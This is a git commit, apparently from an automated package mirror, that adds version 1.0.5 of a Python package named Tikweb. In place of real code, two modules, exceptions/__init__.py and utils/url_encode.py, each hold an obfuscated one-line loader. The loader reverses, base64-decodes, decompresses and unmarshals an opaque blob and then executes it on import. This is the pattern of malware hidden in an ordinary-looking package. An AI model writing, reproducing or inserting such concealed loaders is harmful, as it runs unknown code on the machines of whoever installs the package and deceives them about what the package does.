5241633cffcc685bda26de696451898bce4cbbfd
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-10-02 05:07:06 +0000

    Add package Tikweb/1.0.5/tikweb-1.0.5.tar.gz

---
+++ packages/Tikweb/tikweb-1.0.5.tar.gz/tikweb-1.0.5/Tikweb/exceptions/__init__.py
@@ -0,0 +1,5 @@
+
+# Code By Lariot & Horte
+
+# Country: Madagasikara
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=QXgv2XA86wsptFkde26RtcjVr2IgHQfVnPoPH3xFs80VhH4Gc1vXaK3QKv9os5hzvNsc31fFd/1D67XzljswM5cNeNqeyeqYFWoVBEyG/VUgr1meHgB3IzwbsBVpCigOrAw9WJ4a3iMpv3Cp7J0my6PpxvRycCjIgM/uGB18YZEevcJajqDdjr+LidXD3QBp4JSFDUXLoIeI3MTwaf40wr8WoYdVGtE2KZGOlsv3T3R5p6rYB1t1f4BrklM8Za0zwb3mNZOjjUWPYbg+PYddrheSVSW421wWOHR9dwgma/MZq6h8dqWPLTFZ3J0lLEJcFkZOlzS3jIySiWqk6ZRIwxTo7I3R2dXiHN+t7INiamGFLl5Keg7cyFKrlhO+Kk09WhbSqXI2dIt/tCRunC3MD8s2fN7xpr7KdQK+zj/gz/D4sDyBA6bmmq+6/br3xvBMn7moHdmk2PS+D5plqeKR8UxToeofWkP3uAMgVshBX8mKcqDwMx8YM+rjplRU24Y+DTcaQfOMovq7wBXYA0mu1MUNxJe'))
---
+++ packages/Tikweb/tikweb-1.0.5.tar.gz/tikweb-1.0.5/Tikweb/utils/url_encode.py
@@ -0,0 +1,5 @@
+
+# Code By Lariot & Horte
+
+# Country: Madagasikara
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=IIiooWB4/RYq/ImfeE6Rf+GqjTbgbQe5gPYvj74Mmf6rzL0Ds83zv+bJDL77aSu92Tv6y+887Kv8WB97nY6m7dYnawL3tyW0mrSoiRNMt9YQPUqi2jGoeIPGulrMoTPR0/gXd0ILkQdsV49VSxD2SgZQOsEi2erPK+OkFdTv4mm5YqtoJqW1gEs4QK6js2Bgzex7IMKgKpEankCkDPYJd4ybGLdzTjk9ZoIOqb1osAp8lpV7tRZrEeCzbQ/L2XpMWGrtv1El0lW7b1lNNDtrm5hksz+XZRNL9oD5GNY1CTzNM4TaZL/VeBqBO2eFSo+xFNnultJ2mNmxcQxMsyofICJiSqh8QrJ0bhJLYRQYW9E65TF0lNtny9DW7e+sk2LIGjGT/MJ9MzRw0uchjXNpgc3ztzTXEaKfZ24HZg52XfmgWM3gxxp4P/+NCvMg/K5AA8XP1X51/nRvjfKyY+bjakZTW/I6rknXiKpF9DVPpqh9Rh+cPbHA27rYYJgCXa8xmPbfSYMgFhIKREMuJQ+aQfPMovq7wBXYA0mu1MUNxJe'))
